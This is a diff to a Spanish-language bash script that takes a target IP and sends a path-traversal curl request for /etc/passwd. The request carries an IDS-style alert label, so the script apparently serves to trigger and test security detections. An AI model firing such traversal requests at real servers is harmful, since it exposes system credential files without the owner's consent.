@@ -31,6 +31,32 @@
     echo ""
   fi
 
+# Definir constantes de color
+  cColorAzul="\033[0;34m"
+  cColorAzulClaro="\033[1;34m"
+  cColorVerde='\033[1;32m'
+  cColorRojo='\033[1;31m'
+  # Para el color rojo también:
+    #echo "$(tput setaf 1)Mensaje en color rojo. $(tput sgr 0)"
+  cFinColor='\033[0m'
+
+# Definir la cantidad de argumentos esperados
+  cCantParamEsperados=1
+
+# Comprobar que se hayan pasado la cantidad de parámetros correctos y proceder
+  if [ $# -ne $cCantParamEsperados ]; then
+    echo ""
+    echo -e "${cColorRojo}  Mal uso del script. El uso correcto sería: ${cFinColor}"
+    echo "    $0 [IPDeDestino]"
+    echo ""
+    echo "  Ejemplo:"
+    echo "    $0 '172.16.0.209'"
+    echo ""
+    exit
+  fi
+
+vIP="$1"
+
 # Alerta: Web.Server.Password.File.Access
   curl -X GET "http://"$vIP":80/../../etc/passwd"
 
